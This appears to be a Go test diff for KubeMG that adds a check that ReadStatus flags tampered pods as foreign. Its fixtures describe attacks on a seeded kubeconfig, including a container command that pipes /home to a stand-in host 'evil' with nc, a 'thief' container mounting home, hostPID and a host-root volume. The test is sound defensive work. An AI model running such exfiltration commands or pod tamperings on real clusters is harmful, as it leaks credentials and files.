@@ -240,10 +240,10 @@ func TestReadStatusReadsThePodsOwnAccountOfItself(t *testing.T) {
 // rather than as row 0, which is a row somebody else could own.
 func TestReadStatusCarriesTheCredentialRow(t *testing.T) {
 	for annotation, want := range map[string]uint{
-		"41":         41,
-		"":           0,
-		"not-an-id":  0,
-		"-1":         0,
+		"41":        41,
+		"":          0,
+		"not-an-id": 0,
+		"-1":        0,
 	} {
 		status := ReadStatus(map[string]any{
 			"metadata": map[string]any{
@@ -395,5 +395,64 @@ func TestPodNamesThePullSecretOnlyWhenOneIsConfigured(t *testing.T) {
 	}
 	if got := pod.Spec.ImagePullSecrets; len(got) != 1 || got[0]["name"] != "mirror-pull" {
 		t.Fatalf("imagePullSecrets = %v, want one named mirror-pull", got)
+	}
+}
+
+// The pod KubeMG renders is its own; a pod under the same predictable name
+// that would let something else read the seeded kubeconfig is not.
+func TestReadStatusTellsAForeignPodFromItsOwn(t *testing.T) {
+	render := func() map[string]any {
+		raw, err := PodManifest(PodSpec{Namespace: "kubemg-system", Image: "shell:1", UserID: 7, Now: time.Now()})
+		if err != nil {
+			t.Fatal(err)
+		}
+		var pod map[string]any
+		if err := json.Unmarshal(raw, &pod); err != nil {
+			t.Fatal(err)
+		}
+		return pod
+	}
+	if got := ReadStatus(render()).Foreign; got != "" {
+		t.Fatalf("the rendered pod read as foreign: %s", got)
+	}
+
+	// A mesh sidecar that cannot see the home directory changes nothing.
+	sidecar := render()
+	spec := sidecar["spec"].(map[string]any)
+	spec["containers"] = append(spec["containers"].([]any), map[string]any{"name": "istio-proxy", "image": "proxy"})
+	if got := ReadStatus(sidecar).Foreign; got != "" {
+		t.Fatalf("an unrelated sidecar read as foreign: %s", got)
+	}
+
+	cases := map[string]func(spec map[string]any){
+		"agent service account": func(spec map[string]any) { spec["serviceAccountName"] = "kubemg-agent" },
+		"token mounted":         func(spec map[string]any) { spec["automountServiceAccountToken"] = true },
+		"token not declared":    func(spec map[string]any) { delete(spec, "automountServiceAccountToken") },
+		"shared processes":      func(spec map[string]any) { spec["shareProcessNamespace"] = true },
+		"host pid":              func(spec map[string]any) { spec["hostPID"] = true },
+		"other command": func(spec map[string]any) {
+			spec["containers"].([]any)[0].(map[string]any)["command"] = []any{"/bin/sh", "-c", "nc evil 1 < /home"}
+		},
+		"extra args": func(spec map[string]any) {
+			spec["containers"].([]any)[0].(map[string]any)["args"] = []any{"x"}
+		},
+		"reader of home": func(spec map[string]any) {
+			spec["containers"] = append(spec["containers"].([]any), map[string]any{
+				"name": "thief", "volumeMounts": []any{map[string]any{"name": "home", "mountPath": "/loot"}},
+			})
+		},
+		"home on a host path": func(spec map[string]any) {
+			spec["volumes"].([]any)[0] = map[string]any{"name": "home", "hostPath": map[string]any{"path": "/"}}
+		},
+		"no shell container": func(spec map[string]any) {
+			spec["containers"].([]any)[0].(map[string]any)["name"] = "other"
+		},
+	}
+	for name, mutate := range cases {
+		pod := render()
+		mutate(pod["spec"].(map[string]any))
+		if ReadStatus(pod).Foreign == "" {
+			t.Errorf("%s: read as KubeMG's own pod", name)
+		}
 	}
 }
